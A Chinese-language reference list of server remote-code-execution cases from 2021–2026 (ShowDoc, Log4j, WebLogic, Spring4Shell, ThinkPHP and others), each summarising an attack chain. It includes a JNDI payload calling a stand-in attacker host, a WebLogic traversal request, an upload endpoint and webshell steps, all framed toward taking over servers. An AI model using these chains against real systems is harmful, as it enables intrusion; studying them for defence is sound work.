# 服务器抢 Shell 经典案例库(2021-2026)

> 2026-08-08 全网搜集。来源: Google News RSS 验证 + Pentester Land writeup 数据库(6421 条中 2003 条 RCE 相关)+ 公开 POC。

## 2026 在野利用(实时)

### ShowDoc 服务器批量接管(2026-04, 中文项目)
- 来源: Hackread《ShowDoc Vulnerability Patched in 2020 Now Used in Active Server Takeovers》
- POC: https://github.com/huamang/showdoc_poc (sqli.py / unser.py / shell.php)
- 链: SQL 注入 + ddddocr 过验证码 → 拿 user_token → phpggc Guzzle/FW1 生成 phar.png → 上传 `/server/index.php?s=/api/page/uploadImg&user_token=<token>` → phar:// 触发反序列化 → 写 webshell 到 Public/Uploads/
- 要点: PHP 绝对路径泄露(`/server/index.php?s=xx/xx/xx` 响应正则提取);phar.png 伪装图片绕上传校验

### SharePoint(2026-07)
- 来源: Resecurity《From Web Request to Domain Compromise: Understanding the July 2026 SharePoint Attacks》
- 链: Web 请求 → 域接管

### React2Shell(2025-12)
- 来源: wiz.io《React2Shell: Technical Deep-Dive & In-the-Wild Exploitation of CVE-2025-55182》
- 链: React Server Components 反序列化 → RCE

### Magento PolyShell(2026-03)
- 来源: The Hacker News《Magento PolyShell Flaw Enables Unauthenticated Uploads, RCE and Account Takeover》
- 链: 多后缀图片(合法图片+代码, 利用多 MIME 解析差异)→ 未认证上传 → RCE

## 经典案例

### .MOBI TLD 接管($20 → 整个注册局 WHOIS)
- 来源: watchTowr Labs《We Spent $20 To Achieve RCE And Accidentally Became The Admins Of .MOBI》
- 链: .MOBI WHOIS 服务器域名 dotmobiregistry.net 过期(2023.12)→ $20 买下 → 接管 WHOIS 查询流量 → phpWHOIS RCE(2015 CVE)+ fail2ban 命令注入 → 1.3M+ 查询来源(政府/银行/邮件服务器)沦陷
- 要点: 过期域名/子域接管是隐藏攻击面;WHOIS/DNS 基础设施信任链

### Log4j RCE(CVE-2021-44228)— $24,000 赏金
- 来源: meharhuzaifa Medium《How I got $24000 Bounty from a Log4j RCE in Apple App Store》
- 链: User-Agent/参数注入 `${jndi:ldap://attacker/...}` → LDAP 回连 → 加载恶意类 → RCE
- 要点: JNDI 注入;扫描面 = 所有记录日志的输入点

### WebLogic 未认证 RCE(CVE-2020-14882)
- 来源: Rapid7 / Unit42(Muhstik 僵尸网络利用)
- 链: `GET /console/css/%252e%252e%252fconsole.portal` 路径穿越 → 未认证访问管理端 → 部署 webshell
- 要点: Muhstik 用它挖矿+DDoS = 自动化利用模板

### Spring4Shell(CVE-2022-22965)
- 来源: Rapid7/Microsoft/Unit42
- 链: Spring MVC 参数绑定 → class.module.classLoader 写入 → 部署 webshell;被用于部署加密货币矿机

### ThinkPHP 老 CVE 批量利用(2024)
- 来源: Akamai《2024: Old CVEs, New Targets — Active Exploitation of ThinkPHP》
- 要点: 老 CVE(2021-46140 等)仍在被批量扫;ThinkPHP 是中文站最常被抢 shell 的框架

### SPIP 预认证 RCE 2024
- 来源: thinkloveshare《SPIP Preauth RCE 2024: Part 2, A Big Upload》
- 漏洞: SPIP ≤ 4.3.1 预认证文件上传 → RCE(CERTFR-2024-AVI-0702)
- 要点: 先找认证态利用 → 再去掉认证(常见升级路径)

### Jenkins 文件读到 RCE(CVE-2024-43044)
- 来源: Conviso《From file read to RCE in Jenkins through agents》
- 链: agent 任意文件读 → 读取密钥 → 构造 RCE

### Moodle RCE(2024)
- 来源: redteam-pentesting《Back To School - Exploiting A Remote Code Execution Vulnerability In Moodle》

### WordPress 插件 POP 链(2024, 多个)
- 来源: Wordfence《$4,998 Bounty... 100,000 WordPress Sites Protected Against Unauthenticated RCE》
- 案例: GiveWP POP to RCE(CVE-2024-5932)、WPML Twig SSTI、Nonce 授权绕过

## 案例规律总结

1. 资金链/数据链价值最高,但 getshell 是前提
2. 逻辑漏洞(上传/反序列化/路径穿越)> 传统 Web 漏洞(SQLi/XSS)在 2026 被 WAF 大量挡住
3. 老 CVE 批量自动化利用是主流(2026 特证)
4. 中文开源项目(ShowDoc/ThinkPHP)是重灾区
5. 隐藏资产(开发环境/过期域名/备份文件)高价值
